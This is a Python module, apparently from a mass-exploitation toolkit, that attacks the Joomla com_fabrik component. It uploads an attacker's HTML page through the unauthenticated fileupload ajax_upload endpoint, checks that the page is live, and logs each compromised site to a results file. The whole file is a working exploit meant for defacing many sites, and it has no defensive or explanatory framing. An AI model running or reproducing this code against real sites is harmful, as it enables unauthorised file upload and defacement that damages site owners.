
# coding=utf-8
import re
import requests
from core import printmodels

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
TextindeX = 'files/vuln.htm'

user = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}


def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://"):
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def Exploit(site):
    i = 'http://'+URLdomain(site)
    try:
            url = i+'/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload'
            filename = open("files/DrDataYE.html",'rb')
            files = {"file": filename}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
            r = requests.post(url,files=files,headers=user)
            g = requests.get(i+"/DrDataYE.html")
            if 'DrDataYE' in g.text:
                vuln = i+'/DrDataYE.html'
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(vuln+'\n')
                return printmodels.returnYes(site, 'N/A', 'Com_Fabrik_Index', 'Joomla')
            else:
                return printmodels.returnNo(site, 'N/A', 'Com_Fabrik_Index', 'Joomla')
    except:
        return printmodels.returnNo(site, 'N/A', 'Com_Fabrik_Index', 'Joomla')














